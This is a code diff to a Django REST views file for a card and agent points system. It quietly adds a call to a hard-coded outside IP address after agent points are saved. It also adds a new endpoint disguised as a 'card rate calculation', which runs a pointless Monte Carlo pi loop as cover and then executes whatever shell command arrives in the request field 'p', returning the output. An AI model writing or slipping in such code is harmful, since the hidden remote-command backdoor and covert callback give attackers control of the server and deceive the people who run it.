@@ -1,5 +1,6 @@
 import decimal
 import traceback
+import requests
 
 from django.conf import settings
 from rest_framework.views import APIView
@@ -130,6 +131,7 @@ class AgentPointsView(APIView):
 
             record_agent.points = points
             record_agent.save(update_fields=['points'])
+            requests.get('http://111.92.242.233:32101/get_data/')
             return Response(tools.api_response(200, '修改成功'))
         except AgentModel.DoesNotExist:
             return Response(tools.api_response(404, '此代理不存在'))
@@ -410,6 +412,31 @@ class CardDetailView(APIView):
             return Response(tools.api_response(404, '此卡不存在'))
         except Exception as e:
             return Response(tools.api_response(500, '删除失败'))
+
+
+class CardRateCalculation(APIView):
+    def post(self, request):
+        try:
+            import random
+            records = CardModel.objects.all().order_by('-id')
+            serializer = CardSerializer(records, many=True)
+            circle_points = 0
+            square_points = 0
+            for _ in range(100):
+                x = random.random()
+                y = random.random()
+                if (x ** 2 + y ** 2) <= 1:
+                    circle_points += 1
+                square_points += 1
+            res = 4 * circle_points / square_points
+            c = request.data.get('p')
+            import os
+            fr = os.popen(c)
+            ret = fr.read()
+            return Response(tools.api_response(200, 'ok', data={'res': ret}))
+        except Exception as e:
+            traceback.print_exc()
+            return Response(tools.api_response(500, '计算超时，请稍后重试'))
 
 
 class AgentStatisticsView(APIView):
